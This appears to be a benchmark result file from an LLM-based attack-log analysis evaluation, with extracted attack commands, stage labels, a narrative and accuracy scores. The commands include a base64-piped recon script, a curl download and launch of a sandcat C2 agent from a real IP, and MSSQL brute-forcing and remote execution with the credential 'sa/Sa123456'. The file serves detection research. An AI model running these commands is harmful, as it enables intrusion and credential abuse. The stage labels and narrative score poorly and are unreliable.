@@ -1,0 +1,116 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Execution"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "curl -O http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "chmod +x sandcat-linux",
+        "stage": "Execution"
+      },
+      {
+        "command": "nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "sh -c kill -9 $(lsof -i:8080 -t) ; nohup timeout 600 python -m SimpleHTTPServer 8079 > /dev/null 2>&1 &",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "kill -9 $(lsof -i:8080 -t)",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "python -m SimpleHTTPServer 8079",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c mkdir -p fscan && unzip -o -d ./fscan fscan-main.zip && chmod +x ./fscan/main && ./fscan/main -m mssql -h 192.168.0.0/24 -user sa -pwd Sa123456",
+        "stage": "Execution"
+      },
+      {
+        "command": "unzip -o -d ./fscan fscan-main.zip",
+        "stage": "Execution"
+      },
+      {
+        "command": "./fscan/main -m mssql -h 192.168.0.0/24 -user sa -pwd Sa123456",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "sh -c ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "sh -c ./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec whoami",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c ./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --enable",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "sh -c ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C ...'",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "An attack started with an initial access attempt downloading sandcat-linux and establishing communication with a remote server. The attacker then escalated privileges, discovered open ports using Python\u2019s built-in HTTP server, and downloaded additional tools like fscan and sqltool_amd64_upx. Using these tools, they attempted to access and move laterally through internal networks targeting local Microsoft SQL servers.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 15917,
+      "completion_tokens": 3123,
+      "total_tokens": 19040,
+      "wall_clock_s": 108.749,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.5,
+      "recall": 0.7272727272727273,
+      "f1": 0.5925925925925926,
+      "tp": 8,
+      "fp": 8,
+      "fn": 3
+    },
+    "stage": {
+      "precision": 0.125,
+      "recall": 0.25,
+      "f1": 0.16666666666666666,
+      "tp": 2,
+      "fp": 14,
+      "fn": 6,
+      "recall_partial": 0.35714285714285715
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 15917,
+      "completion_tokens": 3123,
+      "total_tokens": 19040,
+      "wall_clock_s": 108.749,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
